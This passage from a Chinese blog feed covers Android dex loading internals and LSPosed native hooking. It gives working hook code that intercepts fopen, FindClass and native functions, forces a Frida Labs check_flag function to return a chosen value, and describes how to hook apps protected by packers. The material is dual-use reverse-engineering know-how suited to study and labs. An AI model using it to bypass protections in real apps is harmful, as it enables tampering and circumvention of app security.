class="line">DexFile(String fileName, ClassLoader loader, DexPathList.Element[] elements) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    mCookie = openDexFile(fileName, <span class="literal">null</span>, <span class="number">0</span>, loader, elements);</span><br><span class="line">    mInternalCookie = mCookie;</span><br><span class="line">    mFileName = fileName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>openDexFile:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">openDexFile</span><span class="params">(String sourceName, String outputName, <span class="type">int</span> flags,</span></span><br><span class="line"><span class="params">        ClassLoader loader, DexPathList.Element[] elements)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> openDexFileNative(<span class="keyword">new</span> <span class="title class_">File</span>(sourceName).getAbsolutePath(),</span><br><span class="line">                             (outputName == <span class="literal">null</span>) ? <span class="literal">null</span> : <span class="keyword">new</span> <span class="title class_">File</span>(outputName).getAbsolutePath(),</span><br><span class="line">                             flags,</span><br><span class="line">                             loader,</span><br><span class="line">                             elements);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>sourceName为PathClassLoader构造函数传递的dexPath中以分隔符划分之后的文件名；</li><li>outputName为null；</li><li>flags = 0</li><li>loader为null；</li><li>elements为makeDexElements()过程生成的Element数组；</li></ol><p><strong>openDexFileNative:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> jobject <span class="title">DexFile_openDexFileNative</span><span class="params">(JNIEnv* env,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jclass,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jstring javaSourceName,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jstring javaOutputName ATTRIBUTE_UNUSED,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jint flags ATTRIBUTE_UNUSED,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jobject class_loader,</span></span></span><br><span class="line"><span class="params"><span class="function">                                         jobjectArray dex_elements)</span> </span>&#123;</span><br><span class="line">  <span class="function">ScopedUtfChars <span class="title">sourceName</span><span class="params">(env, javaSourceName)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (sourceName.<span class="built_in">c_str</span>() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  Runtime* <span class="type">const</span> runtime = Runtime::<span class="built_in">Current</span>();</span><br><span class="line">  ClassLinker* linker = runtime-&gt;<span class="built_in">GetClassLinker</span>();</span><br><span class="line">  std::vector&lt;std::unique_ptr&lt;<span class="type">const</span> DexFile&gt;&gt; dex_files;</span><br><span class="line">  std::vector&lt;std::string&gt; error_msgs;</span><br><span class="line">  <span class="type">const</span> OatFile* oat_file = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">  dex_files = runtime-&gt;<span class="built_in">GetOatFileManager</span>().<span class="built_in">OpenDexFilesFromOat</span>(sourceName.<span class="built_in">c_str</span>(),</span><br><span class="line">                                                               class_loader,</span><br><span class="line">                                                               dex_elements,</span><br><span class="line">                                                               <span class="comment">/*out*/</span> &amp;oat_file,</span><br><span class="line">                                                               <span class="comment">/*out*/</span> &amp;error_msgs);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!dex_files.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    jlongArray array = <span class="built_in">ConvertDexFilesToJavaArray</span>(env, oat_file, dex_files);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/pathlistfindclass.png" alt=""></p><hr><p>整体加载流程如图</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/completeloader.png" alt=""></p>]]></content>
    
    
    <summary type="html">loader</summary>
    
    
    
    <category term="bin" scheme="https://ixout.github.io/categories/bin/"/>
    
    
    <category term="android" scheme="https://ixout.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>xposed: native-hook与加固hook</title>
    <link href="https://ixout.github.io/posts/39380/"/>
    <id>https://ixout.github.io/posts/39380/</id>
    <published>2024-10-28T13:04:19.000Z</published>
    <updated>2025-03-13T13:06:36.217Z</updated>
    
    <content type="html"><![CDATA[<h1 id="native-hook"><a href="#native-hook" class="headerlink" title="native-hook"></a>native-hook</h1><p>xposed进行native hook较为麻烦, 需要第三方的hook框架(例如dobby), 但现在lsposed已经能够原生支持native层hook</p><p><a href="https://github.com/LSPosed/LSPosed/wiki/Native-Hook">Native Hook · LSPosed/LSPosed Wiki</a></p><p>在普通xposed模块编写的基础上添加了以下几个步骤:</p><ol><li><p>正常创建一个xposed模块, 模块中加载之后要注入的so</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.lsposed.example</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainHook</span> : <span class="type">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">handleLoadPackage</span><span class="params">(lpparam: <span class="type">XC_LoadPackage</span>.<span class="type">LoadPackageParam</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName == <span class="string">&quot;org.lsposed.target&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.loadLibrary(<span class="string">&quot;example&quot;</span>)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e: Throwable) &#123;</span><br><span class="line">                LogUtil.e(e)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在AndroidManifest.xml下额外添加两行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:multiArch</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:extractNativeLibs</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>右击main目录, 选择Add C++ to Module, 之后即会在main目录下创建一个cpp文件夹(之后build.gradle中会自动添加一些配置, 有需要可以进行更改, 一般默认即可)</p></li><li><p>cpp文件夹内创建一个头文件, 名字任意内容如下</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*HookFunType)</span><span class="params">(<span class="type">void</span> *func, <span class="type">void</span> *replace, <span class="type">void</span> **backup)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*UnhookFunType)</span><span class="params">(<span class="type">void</span> *func)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*NativeOnModuleLoaded)</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> *handle)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> version;</span><br><span class="line">    HookFunType hook_func;</span><br><span class="line">    UnhookFunType unhook_func;</span><br><span class="line">&#125; NativeAPIEntries;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NativeOnModuleLoaded</span> <span class="params">(*NativeInit)</span><span class="params">(<span class="type">const</span> NativeAPIEntries *entries)</span></span>;</span><br></pre></td></tr></table></figure></li><li><p>编写hook主逻辑cpp</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lspnative.h&quot;</span></span></span><br><span class="line"><span class="type">static</span> HookFunType hook_func = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> (*backup)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">backup</span>() + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FILE *(*backup_fopen)(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode);</span><br><span class="line"></span><br><span class="line"><span class="function">FILE *<span class="title">fake_fopen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(filename, <span class="string">&quot;banned&quot;</span>)) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">backup_fopen</span>(filename, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">jclass</span> (*backup_FindClass)(JNIEnv *env, <span class="type">const</span> <span class="type">char</span> *name);</span><br><span class="line"><span class="function">jclass <span class="title">fake_FindClass</span><span class="params">(JNIEnv *env, <span class="type">const</span> <span class="type">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name, <span class="string">&quot;dalvik/system/BaseDexClassLoader&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">backup_FindClass</span>(env, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">on_library_loaded</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> *handle)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// hooks on `libtarget.so`</span></span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">string</span>(name).<span class="built_in">ends_with</span>(<span class="string">&quot;libtarget.so&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">void</span> *target = <span class="built_in">dlsym</span>(handle, <span class="string">&quot;target_fun&quot;</span>);</span><br><span class="line">        <span class="built_in">hook_func</span>(target, (<span class="type">void</span> *) fake, (<span class="type">void</span> **) &amp;backup);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> [[gnu::<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>)]] [[gnu::used]]</span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *jvm, <span class="type">void</span>*)</span> </span>&#123;</span><br><span class="line">    JNIEnv *env = <span class="literal">nullptr</span>;</span><br><span class="line">    jvm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **)&amp;env, JNI_VERSION_1_6);</span><br><span class="line">    <span class="built_in">hook_func</span>((<span class="type">void</span> *)env-&gt;functions-&gt;FindClass, (<span class="type">void</span> *)fake_FindClass, (<span class="type">void</span> **)&amp;backup_FindClass);</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> [[gnu::<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>)]] [[gnu::used]]</span><br><span class="line"><span class="function">NativeOnModuleLoaded <span class="title">native_init</span><span class="params">(<span class="type">const</span> NativeAPIEntries *entries)</span> </span>&#123;</span><br><span class="line">    hook_func = entries-&gt;hook_func;</span><br><span class="line">    <span class="comment">// system hooks</span></span><br><span class="line">    <span class="built_in">hook_func</span>((<span class="type">void</span>*) fopen, (<span class="type">void</span>*) fake_fopen, (<span class="type">void</span>**) &amp;backup_fopen);</span><br><span class="line">    <span class="keyword">return</span> on_library_loaded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>在assets目录下创建native_init文件, 其中填写实现hook逻辑的so文件名字</p></li></ol><h2 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h2><p>以frida labs的lab-9为例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-13_195757.png" alt=""></p><p>但check_flag函数始终返回1</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-13_195942.png" alt=""></p><p>首先完成上面介绍的步骤</p><p>xposed入口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposed;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> <span class="keyword">implements</span> <span class="title class_">IXposedHookLoadPackage</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;[LuoXposed]&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam lpparam)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpparam.packageName.equals(<span class="string">&quot;com.ad2001.a0x9&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.loadLibrary(<span class="string">&quot;xposed&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>native-hook代码</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;lspnative.h&quot;</span></span></span><br><span class="line"><span class="type">static</span> HookFunType hook_func = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int64_t</span> (*backup)();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int64_t</span> <span class="title">fake</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0x539</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">on_library_loaded</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> *handle)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// hooks on `libtarget.so`</span></span><br><span class="line">    <span class="keyword">if</span> (std::<span class="built_in">string</span>(name).<span class="built_in">compare</span>(<span class="string">&quot;liba0x9.so&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">void</span> *target = <span class="built_in">dlsym</span>(handle, <span class="string">&quot;Java_com_ad2001_a0x9_MainActivity_check_1flag&quot;</span>);</span><br><span class="line">        <span class="built_in">hook_func</span>(target, (<span class="type">void</span> *) fake, (<span class="type">void</span> **) &amp;backup);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> [[gnu::<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>)]] [[gnu::used]]</span><br><span class="line"><span class="function">jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *jvm, <span class="type">void</span>*)</span> </span>&#123;</span><br><span class="line">    JNIEnv *env = <span class="literal">nullptr</span>;</span><br><span class="line">    jvm-&gt;<span class="built_in">GetEnv</span>((<span class="type">void</span> **)&amp;env, JNI_VERSION_1_6);</span><br><span class="line">    <span class="comment">//hook_func((void *)env-&gt;functions-&gt;FindClass, (void *)fake_FindClass, (void **)&amp;backup_FindClass);</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> [[gnu::<span class="built_in">visibility</span>(<span class="string">&quot;default&quot;</span>)]] [[gnu::used]]</span><br><span class="line"><span class="function">NativeOnModuleLoaded <span class="title">native_init</span><span class="params">(<span class="type">const</span> NativeAPIEntries *entries)</span> </span>&#123;</span><br><span class="line">    hook_func = entries-&gt;hook_func;</span><br><span class="line">    <span class="comment">// system hooks</span></span><br><span class="line">    <span class="comment">//hook_func((void*) fopen, (void*) fake_fopen, (void**) &amp;backup_fopen);</span></span><br><span class="line">    <span class="keyword">return</span> on_library_loaded;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cmakelist.txt, 这里就是默认的配置, 没有更改</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># For more information about using CMake with Android Studio, read the</span></span><br><span class="line"><span class="comment"># documentation: https://d.android.com/studio/projects/add-native-code.html.</span></span><br><span class="line"><span class="comment"># For more examples on how to use CMake, see https://github.com/android/ndk-samples.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sets the minimum CMake version required for this project.</span></span><br><span class="line"><span class="keyword">cmake_minimum_required</span>(VERSION <span class="number">3.22</span>.<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Declares the project name. The project name can be accessed via $&#123; PROJECT_NAME&#125;,</span></span><br><span class="line"><span class="comment"># Since this is the top level CMakeLists.txt, the project name is also accessible</span></span><br><span class="line"><span class="comment"># with $&#123;CMAKE_PROJECT_NAME&#125; (both CMake variables are in-sync within the top level</span></span><br><span class="line"><span class="comment"># build script scope).</span></span><br><span class="line"><span class="keyword">project</span>(<span class="string">&quot;xposed&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Creates and names a library, sets it as either STATIC</span></span><br><span class="line"><span class="comment"># or SHARED, and provides the relative paths to its source code.</span></span><br><span class="line"><span class="comment"># You can define multiple libraries, and CMake builds them for you.</span></span><br><span class="line"><span class="comment"># Gradle automatically packages shared libraries with your APK.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In this top level CMakeLists.txt, $&#123;CMAKE_PROJECT_NAME&#125; is used to define</span></span><br><span class="line"><span class="comment"># the target library name; in the sub-module&#x27;s CMakeLists.txt, $&#123;PROJECT_NAME&#125;</span></span><br><span class="line"><span class="comment"># is preferred for the same purpose.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># In order to load a library into your app from Java/Kotlin, you must call</span></span><br><span class="line"><span class="comment"># System.loadLibrary() and pass the name of the library defined here;</span></span><br><span class="line"><span class="comment"># for GameActivity/NativeActivity derived applications, the same library name must be</span></span><br><span class="line"><span class="comment"># used in the AndroidManifest.xml file.</span></span><br><span class="line"><span class="keyword">add_library</span>(<span class="variable">$&#123;CMAKE_PROJECT_NAME&#125;</span> SHARED</span><br><span class="line">    <span class="comment"># List C/C++ source files with relative paths to this CMakeLists.txt.</span></span><br><span class="line">    xposed.cpp)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Specifies libraries CMake should link to your target library. You</span></span><br><span class="line"><span class="comment"># can link libraries from various origins, such as libraries defined in this</span></span><br><span class="line"><span class="comment"># build script, prebuilt third-party libraries, or Android system libraries.</span></span><br><span class="line"><span class="keyword">target_link_libraries</span>(<span class="variable">$&#123;CMAKE_PROJECT_NAME&#125;</span></span><br><span class="line">    <span class="comment"># List libraries link to the target library</span></span><br><span class="line">    android</span><br><span class="line">    log)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>编译安装成功达到目标</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2025-03-13_203513.png" alt=""></p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>有三个关键接口, 也就是hook的三个节点</p><ol><li><p><strong>native_init</strong>, 这是Native Hook的初始化函数, 其中可进行对系统库函数的hook</p><p>例如hook fopen</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hook_func</span>((<span class="type">void</span>*) fopen, (<span class="type">void</span>*) fake_fopen, (<span class="type">void</span>**) &amp;backup_fopen);</span><br></pre></td></tr></table></figure></li><li><p><strong>JNI_OnLoad</strong>,  这是JNI的入口函数，当Java虚拟机加载本地库时会被调用</p><p>可以在这个位置hook jni相关接口函数</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hook_func</span>((<span class="type">void</span> *)env-&gt;functions-&gt;FindClass, (<span class="type">void</span> *)fake_FindClass, (<span class="type">void</span> **)&amp;backup_FindClass);</span><br></pre></td></tr></table></figure></li><li><p><strong>on_library_loaded</strong>, 一个回调函数，当某个库被加载时会被调用, 在此处hook特定so中的特定函数, 使用dlsym通过句柄找到对应的函数地址</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hook_func</span>(target, (<span class="type">void</span> *) fake, (<span class="type">void</span> **) &amp;backup);</span><br></pre></td></tr></table></figure></li></ol><h3 id="hook-func"><a href="#hook-func" class="headerlink" title="hook_func"></a>hook_func</h3><p>通过上述代码可以看到hook的核心是hook_func函数</p><figure class="highlight cc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(*HookFunType)</span><span class="params">(<span class="type">void</span> *func, <span class="type">void</span> *replace, <span class="type">void</span> **backup)</span></span>;</span><br></pre></td></tr></table></figure><p><code>hook_func</code> 接受三个参数：</p><ol><li><code>void *func</code>: 需要被 Hook 的函数的地址</li><li><code>void *replace</code>: 用于替换目标函数的新函数地址</li><li><code>void **backup</code>: 用于保存目标函数原地址的指针</li></ol><p>由于有保存原函数地址到backup, 所以替换的新函数也可以通过backup指针调用原有的函数</p><h1 id="加固hook"><a href="#加固hook" class="headerlink" title="加固hook"></a>加固hook</h1><p>LSPosed在注入进程时App的Application类并未完成加载, 这也就导致真实用于加载App业务相关类的ClassLoader并未出现, hook找到的目标是加固壳的ClassLoader, 所以直接对应用中的函数进行hook的话就会导致<strong>ClassNotFoundException</strong>错误</p><p>有两类解决方法</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>通过对Android下的加固应用进行分析,可以知道壳程序通常是通过在应用进程最先获得执行权限的Application类中的attachBaseContext和onCreate函数中完成对真实Dex的释放以及ClassLoader的切换.</p><p>故可以通过对加固应用Application类的attachBaseContext或onCreate函数进行Hook,来得到真实App的上下文,再通过上下文来获取真实代码释放后的ClassLoader,用于后续的函数Hook.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 